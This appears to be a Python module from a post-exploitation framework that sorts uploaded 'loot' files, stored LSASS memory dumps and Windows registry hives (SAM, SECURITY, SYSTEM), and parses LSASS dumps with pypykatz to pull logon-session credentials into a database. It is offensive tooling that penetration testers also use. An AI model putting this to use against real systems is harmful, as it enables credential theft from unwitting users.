from powerhub.logging import log
from powerhub.sql import get_loot, add_lsass, add_hive
from powerhub.upload import save_file
from powerhub.directories import LOOT_DIR
import re


def get_loot_type(filename):
    """Determine the loot type

    Could be an LSA process dump or a registry hive.
    """
    if re.match(r".*lsass_[0-9]+.dmp(.[0-9]+)?", filename):
        return "DMP"
    elif re.match(r".*sam(.[0-9]+)?", filename):
        return "SAM"
    elif re.match(r".*security(.[0-9]+)?", filename):
        return "SECURITY"
    elif re.match(r".*system(.[0-9]+)?", filename):
        return "SYSTEM"
    elif re.match(r".*software(.[0-9]+)?", filename):
        return "SOFTWARE"


def store_minidump(loot_id, lsass, lass_file):
    """Write the results from parsing the lsass dmp file to the DB"""
    add_lsass(loot_id, lsass, lass_file)


def save_loot(file, loot_id):
    """Process the loot file"""

    filename = save_file(file, dir=LOOT_DIR)
    loot_type = get_loot_type(filename)
    try:
        if loot_type == "DMP":
            from pypykatz.pypykatz import pypykatz
            mimi = pypykatz.parse_minidump_file(filename)
            for _, v in mimi.logon_sessions.items():
                store_minidump(loot_id, v.to_json(), filename)
        else:  # registry hive
            add_hive(loot_id, loot_type, filename)
    except ImportError as e:
        log.error("You have unmet dependencies, loot could not be processed")
        log.exception(e)
